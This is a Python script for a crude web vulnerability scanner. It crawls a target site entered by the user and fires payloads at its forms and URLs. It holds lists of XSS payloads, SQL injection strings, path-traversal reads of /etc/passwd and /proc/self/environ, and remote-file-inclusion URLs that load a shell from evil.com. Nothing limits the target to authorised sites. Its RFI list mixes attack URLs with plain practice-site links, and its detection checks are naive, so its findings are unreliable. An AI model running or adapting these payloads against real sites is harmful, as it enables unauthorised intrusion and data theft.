import requests
from bs4 import BeautifulSoup
import subprocess
import urllib.parse

print("please go run install-requirements.bat before running this script if you havent already")
answer = input("Do you want to run it? (y/n): ")

if answer == "y" or answer == "Y":
    print("Running...")
    subprocess.run(["install-requirements.bat"], shell=True)

# Payloads for various vulnerabilities
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<img src=x onerror=alert('XSS')>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 LIMIT 1 --",
    "' UNION SELECT null, version() --",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "/etc/passwd",
    "/proc/self/environ",
]

RFI_PAYLOADS = [
    "http://testphp.vulnweb.com/listproducts.php?cat=1",  # Acunetix Test Site
    "http://dvwa.co.uk/vulnerabilities/fi/?page=http://evil.com/shell.txt",  # DVWA Example
    "http://www.itsecgames.com/mutillidae/?page=http://evil.com/shell.txt",  # Mutillidae Example
    "https://pentesterlab.com/exercises/file_inclusion",  # PentesterLab
]


def sanitize_url(domain):
    """Ensures the URL is correctly formatted."""
    domain = domain.strip()
    if not domain.startswith("http"):
        domain = "https://" + domain
    return domain.rstrip('/')

def get_forms(url):
    """Extracts all forms from a webpage."""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException:
        return []

def test_xss(url):
    """Tests for XSS vulnerabilities using multiple payloads."""
    found = False
    forms = get_forms(url)
    for form in forms:
        inputs = form.find_all("input")
        for input_tag in inputs:
            if input_tag.get("name"):
                for payload in XSS_PAYLOADS:
                    data = {input_tag["name"]: payload}
                    response = requests.post(url, data=data)
                    if payload in response.text:
                        print(f"[❌] XSS Found: {url} (Payload: {payload})")
                        found = True
                        break
    return found

def test_sqli(url):
    """Tests for SQL Injection vulnerabilities using multiple payloads."""
    if "=" in url:
        for payload in SQLI_PAYLOADS:
            test_url = url + payload
            try:
                response = requests.get(test_url)
                if "sql" in response.text.lower() or "error" in response.text.lower():
                    print(f"[❌] SQL Injection Found: {url} (Payload: {payload})")
                    return True
            except requests.RequestException:
                pass
    return False

def test_lfi(url):
    """Tests for Local File Inclusion vulnerabilities."""
    for payload in LFI_PAYLOADS:
        test_url = f"{url}?file={payload}"
        try:
            response = requests.get(test_url)
            if "root:x" in response.text or "[extensions]" in response.text:
                print(f"[❌] LFI Found: {url} (Payload: {payload})")
                return True
        except requests.RequestException:
            pass
    return False

def test_rfi(url):
    """Tests for Remote File Inclusion vulnerabilities."""
    for payload in RFI_PAYLOADS:
        test_url = f"{url}?file={payload}"
        try:
            response = requests.get(test_url)
            if "http://evil.com" in response.text or "malicious.example.com" in response.text:
                print(f"[❌] RFI Found: {url} (Payload: {payload})")
                return True
        except requests.RequestException:
            pass
    return False

def find_links(url):
    """Finds all internal links on the website."""
    links = set()
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, "html.parser")
        for a_tag in soup.find_all("a", href=True):
            link = urllib.parse.urljoin(url, a_tag["href"])
            if url in link:
                links.add(link)
    except requests.RequestException:
        pass
    return links

def scan_page(url):
    """Scans a single page for vulnerabilities and prints results."""
    print(f"\n🔍 Checking: {url}")

    found_vulns = []
    if test_xss(url):
        found_vulns.append("XSS")
    if test_sqli(url):
        found_vulns.append("SQL Injection")
    if test_lfi(url):
        found_vulns.append("LFI")
    if test_rfi(url):
        found_vulns.append("RFI")

    if found_vulns:
        print(f"🚨 Vulnerabilities Found on {url}: {', '.join(found_vulns)}")
    else:
        print(f"✅ No vulnerabilities found on {url}")

    return found_vulns

def main():
    target = input("Enter target website URL: ")
    target = sanitize_url(target)

    print(f"\n🔍 Scanning {target}...\n")

    vulnerabilities = {}
    
    # Scan the main page
    vulnerabilities[target] = scan_page(target)

    # Find and scan all other pages
    paths = find_links(target)
    for path in paths:
        vulnerabilities[path] = scan_page(path)

    # Display final summary
    print("\n🔎 FINAL REPORT:")
    for url, vulns in vulnerabilities.items():
        if vulns:
            print(f"❌ {url} -> {', '.join(vulns)}")
        else:
            print(f"✅ {url} -> No vulnerabilities found")

if __name__ == "__main__":
    main()
